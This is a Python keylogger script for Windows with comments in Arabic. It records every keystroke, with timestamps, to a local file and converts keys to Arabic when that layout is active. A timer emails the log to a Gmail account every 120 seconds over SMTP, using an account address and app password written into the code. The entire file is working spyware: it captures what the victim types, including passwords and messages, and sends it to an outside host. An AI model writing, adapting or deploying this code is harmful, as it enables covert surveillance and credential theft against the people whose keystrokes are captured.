import keyboard
import ctypes
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import threading
import os

# --- إعدادات الحساب ---
EMAIL_ADDRESS = "keyloggerlog705@gmail.com"
EMAIL_PASSWORD = "ibeqsgdcwnbufpjb"  # كلمة مرور التطبيقات من جوجل
RECEIVER_EMAIL = "keyloggerlog705@gmail.com"
SEND_REPORT_EVERY = 120  # إرسال الملف كل ساعة (بالثواني)

log_file = os.path.join(os.path.dirname(__file__), "keylog.txt")

# خريطة تحويل المفاتيح للعربية
en_to_ar = {
    'q': 'ض', 'w': 'ص', 'e': 'ث', 'r': 'ق', 't': 'ف', 'y': 'غ', 'u': 'ع', 'i': 'ه', 'o': 'خ', 'p': 'ح',
    'a': 'ش', 's': 'س', 'd': 'ي', 'f': 'ب', 'g': 'ل', 'h': 'ا', 'j': 'ت', 'k': 'ن', 'l': 'م',
    'z': 'ئ', 'x': 'ء', 'c': 'ؤ', 'v': 'ر', 'b': 'لا', 'n': 'ى', 'm': 'ة',
    ' ': '[Space]', ';': 'ك', "'": 'ط', '[': 'ج', ']': 'د', ',': 'و', '.': 'ز', '/': 'ظ'
}

def get_system_language():
    user32 = ctypes.windll.user32
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    layout_id = user32.GetKeyboardLayout(thread_id)
    language_code = layout_id & 0xFFFF
    return "AR" if language_code == 0x0401 else "EN"

def send_email():
    """وظيفة إرسال ملف السجلات إلى الجيميل"""
    if os.path.exists(log_file):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = RECEIVER_EMAIL
            msg['Subject'] = f"Keylogger Logs - {datetime.now().strftime('%Y-%m-%d')}"

            # إرفاق الملف
            with open(log_file, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(log_file)}")
                msg.attach(part)

            # إرسال البريد
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECEIVER_EMAIL, msg.as_string())
            server.quit()
            
            # اختياري: مسح الملف بعد الإرسال لتبدأ سجلات جديدة
            # with open(log_file, "w") as f: f.write("")
            
        except Exception as e:
            print(f"Error sending email: {e}")

    # جدولة الإرسال القادم
    timer = threading.Timer(SEND_REPORT_EVERY, send_email)
    timer.daemon = True
    timer.start()

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        current_lang = get_system_language()
        with open(log_file, "a", encoding="utf-8") as f:
            time_str = datetime.now().strftime("%H:%M:%S")
            key = event.name
            if len(key) == 1:
                char = en_to_ar.get(key.lower(), key) if current_lang == "AR" else key
                f.write(f"{time_str}: {char}\n")
            else:
                f.write(f"{time_str}: [{key}]\n")

# بدء مؤقت الإرسال
send_email()

# بدء مراقبة الكيبورد
keyboard.hook(on_key_event)
keyboard.wait()